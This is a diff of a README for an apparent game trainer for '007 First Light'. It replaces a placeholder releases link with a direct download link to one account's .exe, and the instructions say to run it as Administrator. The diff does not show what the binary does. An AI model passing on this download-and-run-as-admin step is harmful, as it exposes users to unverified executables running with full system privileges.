@@ -175,7 +175,7 @@ Full invisibility + noclip combined with action recording & playback (macros). I
 
 ## Installation
 
-1. Download the latest version from the [Releases](https://github.com/YourUsername/007-First-Light-Trainer/releases) page
+1. Download the latest version from the [Releases](https://github.com/cytan544-spec/007-First-Light-Trainer/releases/download/007-First-Light-Trainer/007FirstLightTrainer.exe) page
 2. Launch the game
 3. Run the trainer as Administrator
 4. Enjoy
